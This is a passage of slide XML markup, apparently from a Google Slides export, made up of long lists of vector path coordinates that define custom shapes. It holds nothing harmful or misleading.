                  <a:lnTo>
                    <a:pt x="6567" y="2751"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="2678"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="5100" y="15590"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5246" y="15627"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="15700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="15737"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5320" y="15810"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="15920"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="16030"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5210" y="16177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="16360"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="16434"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="16507"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="16580"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5430" y="16617"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5540" y="16617"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5870" y="16947"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6237" y="17167"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="17351"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="17424"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3449" y="17387"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3596" y="17314"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="17167"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="16984"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4476" y="16837"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4696" y="16654"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4770" y="16690"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4880" y="16690"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="16654"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="16580"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="16397"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5210" y="16214"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="16103"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5100" y="16030"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="15993"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5100" y="15773"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5100" y="15590"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9795" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9648" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="110"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="220"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8988" y="404"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="514"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8915" y="661"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8915" y="771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8915" y="881"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8988" y="1027"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9025" y="1137"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7631" y="2201"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7007" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6384" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5797" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5650" y="2275"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5577" y="2385"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5100" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4623" y="2421"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="2641"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2312" y="3302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="3558"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="3925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1138" y="4365"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="808" y="4806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="331" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="6896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="148" y="9097"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="294" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="478" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="698" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="991" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1358" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="11958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="12325"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2679" y="12655"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3156" y="12912"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3706" y="13132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="13279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="13389"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="13462"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="13462"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6494" y="13426"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="13352"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7594" y="13206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8108" y="13022"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8621" y="12802"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="12509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="12215"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10052" y="11775"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10492" y="11262"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10932" y="10711"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11299" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11629" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11886" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12106" y="8290"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12179" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12216" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12253" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12216" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12106" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11922" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11739" y="5172"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11482" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11189" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10859" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10822" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10712" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10272" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10162" y="3302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9832" y="3082"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="2861"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9135" y="2678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="2531"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="2421"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="1871"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="1394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="1394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9868" y="1358"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9978" y="1284"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10052" y="1211"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10602" y="1468"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11079" y="1798"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11556" y="2128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11996" y="2531"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12399" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12766" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13060" y="3925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13353" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13573" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13757" y="5539"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13903" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14013" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14087" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14087" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14087" y="8510"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14013" y="9097"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13867" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13720" y="10381"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13463" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13206" y="11592"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12876" y="12179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12473" y="12692"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12069" y="13206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11592" y="13683"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11079" y="14049"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="14416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9978" y="14710"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="14966"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="15150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8181" y="15260"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="15333"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6897" y="15370"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="15333"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="15296"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="15186"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="15076"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="14893"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="14673"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="14453"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="14416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3706" y="14343"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3706" y="14269"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3706" y="14196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="14123"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="14013"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3376" y="13939"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3229" y="13903"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3009" y="13903"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2899" y="13939"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="14013"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2642" y="14123"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="14269"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="14416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2642" y="14563"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="14710"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="14820"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2972" y="14856"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3119" y="14893"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3266" y="14856"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3376" y="14746"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="14856"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4036" y="15150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="15333"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="15480"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4770" y="15553"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="15590"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="15810"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4623" y="16030"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="16470"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3963" y="16654"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3376" y="16910"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="17167"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2128" y="17387"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="17424"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="17497"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1982" y="17571"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1982" y="17644"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="17717"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="17791"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2128" y="17828"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2202" y="17864"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="17901"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="17901"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8548" y="17864"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8621" y="17791"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8621" y="17717"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8621" y="17644"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8621" y="17571"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="17497"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="17424"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8108" y="17277"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="17167"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7264" y="17057"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="16947"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6494" y="16764"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="16544"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5907" y="16324"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5797" y="16214"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5650" y="16140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5650" y="16103"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5687" y="15920"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5650" y="15737"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6127" y="15810"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="15847"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7631" y="15847"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8218" y="15773"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="15627"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9428" y="15480"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10015" y="15260"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="14966"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11079" y="14673"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11592" y="14306"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12069" y="13903"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12509" y="13462"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12913" y="12986"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13280" y="12472"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13573" y="11922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13867" y="11372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14087" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14307" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14417" y="9574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14527" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14600" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14600" y="7703"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14564" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14490" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14380" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14197" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13977" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13720" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13353" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12986" y="2861"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12509" y="2311"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="1834"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11482" y="1394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="1027"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10602" y="881"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10272" y="734"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="441"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10272" y="294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="147"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="994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298" name="Google Shape;298;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6071400" y="1791425"/>
              <a:ext cx="402625" cy="375100"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="16105" h="15004" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="13170" y="587"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="13206" y="624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13280" y="661"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13353" y="697"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13610" y="771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13830" y="844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14013" y="954"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14160" y="1174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14307" y="1394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14343" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14307" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14233" y="2128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14087" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13903" y="2531"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13683" y="2678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13463" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13170" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12840" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12656" y="2751"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12546" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12436" y="2641"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12363" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12289" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12253" y="2275"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12253" y="2054"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12253" y="1871"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12289" y="1724"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12399" y="1394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12583" y="1064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12840" y="807"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12986" y="697"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13170" y="587"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9061" y="3338"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9245" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9245" y="3448"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="3668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9135" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8988" y="3448"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8988" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8988" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="3338"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="14123" y="440"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="14233" y="477"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14307" y="587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14417" y="661"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14454" y="807"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14527" y="807"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14490" y="624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14454" y="477"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14600" y="551"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14784" y="624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14967" y="771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15114" y="881"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15224" y="1064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15334" y="1211"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15444" y="1578"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15554" y="1944"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15627" y="2385"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15664" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15627" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15591" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15481" y="3118"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15187" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14930" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14600" y="3705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14270" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13940" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13720" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13500" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13316" y="3668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13133" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12950" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12803" y="3338"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12656" y="3192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12546" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12840" y="3118"/>
                  </a:lnTo>
                  <a:lnTo>
